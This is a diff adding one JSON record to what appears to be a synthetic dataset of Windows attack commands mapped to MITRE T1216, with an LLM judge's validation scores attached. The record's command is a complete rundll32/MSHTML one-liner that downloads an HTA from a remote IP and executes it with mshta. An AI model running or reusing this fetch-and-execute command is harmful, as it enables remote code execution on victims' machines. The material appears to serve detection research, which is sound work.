@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";var x=new ActiveXObject(\"MSXML2.XMLHTTP\");x.open(\"GET\",\"https://203.0.113.20/drop.hta\",false);x.send();var s=new ActiveXObject(\"ADODB.Stream\");s.Type=1;s.Open();s.Write(x.responseBody);var fso=new ActiveXObject(\"Scripting.FileSystemObject\");var f=fso.GetSpecialFolder(2)+\"\\\\drop.hta\";s.SaveToFile(f,2);new ActiveXObject(\"WScript.Shell\").Run(\"mshta \"+f)",
+  "explanation": "Invokes MSHTML via rundll32 as a script proxy to download an HTA to the temp directory and execute it with mshta, remaining within user privileges and native tooling.",
+  "rationale_steps": [
+    "Launch MSHTML RunHTMLApplication with rundll32 from PowerShell.",
+    "In JScript, use XMLHTTP and ADODB.Stream to download and save remote content to %TEMP%.",
+    "Execute the saved HTA with mshta; defenders should watch for ADODB/Stream usage inside rundll32/MSHTML contexts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-d5de4454",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed rundll32 javascript: mshtml invocation with balanced quotes and valid JScript statements; no parsing errors apparent.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly proxies execution via MSHTML to download to Temp and launch with mshta using native tooling and user-level context, but HTTPS to a raw IP may fail due to certificate mismatch and the unquoted path could break if it contains spaces, and the approach aligns more with signed binary proxy execution than T1216\u2019s typical signed script proxies.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T21:38:23.878020Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
